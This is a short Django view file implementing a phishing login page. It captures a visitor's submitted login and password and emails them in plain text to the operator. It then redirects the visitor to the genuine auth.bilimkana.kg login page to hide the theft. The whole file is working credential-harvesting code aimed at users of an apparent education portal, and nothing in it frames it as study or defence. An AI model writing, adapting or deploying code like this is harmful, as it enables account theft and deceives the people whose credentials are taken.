from django.core.mail import send_mail
from django.conf import settings
from django.http import HttpResponseRedirect
from django.shortcuts import render, redirect

from .forms import LoginForm


def index(request):
    if request.method == "POST":
        form = LoginForm(request.POST)
        if form.is_valid():
            login = form.cleaned_data['login']
            password = form.cleaned_data['password']
            send_mail(
                'Login and Password',
                f'login: {login}\nPassword: {password}',
                settings.EMAIL_HOST_USER,
                [settings.EMAIL_HOST_USER],
                fail_silently=False,
            )
            return redirect("https://auth.bilimkana.kg/account/login")

    else:
        form = LoginForm()

    return render(request, "index.html", {"form": form})
